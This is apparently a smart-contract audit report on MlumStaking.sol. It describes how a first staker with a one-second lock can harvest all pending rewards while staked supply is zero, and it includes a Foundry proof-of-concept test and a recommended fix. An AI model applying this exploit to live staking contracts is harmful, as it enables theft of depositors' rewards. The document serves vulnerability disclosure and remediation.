# First staker in `MlumStaking.sol` can steal all the rewards

## Summary
If there are rewards in the contract but the `_stakedSupply` is 0, they can be stolen.
The problem is because when creating a position and there are no other stakers the `_stakedSupply` is 0 and `_accRewardsPerShare` is 0 as well and this will make the `rewardDebt` to 0 as well, which leads to the attack vector being possible. This attack is possible because on IOTA EVM the transactions are executed at random so there is a chance that the first staker transaction is executed after the rewards.

## Vulnerability Detail
Let's assume that the transaction for the rewards gets processed before the malicious first staker creating position transaction

Here is what the attacker will do:

He creates a position and for `lockDuration` he passes 1 second, he does this so he can withdraw his staking tokens almost immediately after the attack.

In `createPosition` when the `updatePool` is called it will skip setting the `_accRewardsPerShare`  because
`_stakedSupply` is 0

```solidity

>> if (lastRewardBalance == rewardBalance || _stakedSupply == 0) {
>>          return;
        }

        uint256 accruedReward = rewardBalance - lastRewardBalance;

>>      _accRewardsPerShare =
            accRewardsPerShare +
            ((accruedReward * (PRECISION_FACTOR)) /
                (_stakedSupplyWithMultiplier));
```
so his `rewardDebt` will be set to 0 in the position struct in `createPosition()` here:

```solidity
 _stakingPositions[currentTokenId] = StakingPosition({
            initialLockDuration: lockDuration,
            amount: amount,
>>          rewardDebt: (amountWithMultiplier * (_accRewardsPerShare)) /
                (PRECISION_FACTOR),
            lockDuration: lockDuration,
            startLockTime: _currentBlockTimestamp(),
            lockMultiplier: lockMultiplier,
            amountWithMultiplier: amountWithMultiplier,
            totalMultiplier: lockMultiplier
        });
```

then he will call `harvestPosition()` which before calling the internal `_harvestPosition()` it calls the `updatePool` again which this time will set the `_accRewardsPerShare`
So when he harvests it will calculate his `pending` like this:

```solidity
 uint256 pending = (position.amountWithMultiplier *
            _accRewardsPerShare) /
            PRECISION_FACTOR -
            position.rewardDebt;
```
It should return 0 but it will not because
 `(position.amountWithMultiplier * _accRewardsPerShare) / PRECISION_FACTOR` is not equal to ` position.rewardDebt`
 So `pending` will be all of the rewards in the contract

Add the following test to `MlumStaking.t.sol`:

ALICE will be the malicious user:
```solidity

 function testStealAllRewards() public {
        _stakingToken.mint(ALICE, 1 ether);
        _stakingToken.mint(BOB, 1 ether);
        _rewardToken.mint(address(_pool), 1000e6);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 1 seconds);
        vm.stopPrank();

        vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 90 days);
        vm.stopPrank();

        vm.prank(ALICE);
        _pool.harvestPosition(1);

        vm.prank(BOB);
        _pool.harvestPosition(2);

        console.log("Balance of Alice: ", _rewardToken.balanceOf(ALICE));
        //Balance of Alice:  999999999
        console.log("Balance of Bob: ", _rewardToken.balanceOf(BOB));
        //Balance of Bob:  0
    }

```

## Impact
Impact is High because the fist staker managed to get rewards that he should not even have acquired

## Tool used

Manual Review

## Recommendation
The easiest way to solve this is by creating a fake position to the owner in the initialize function
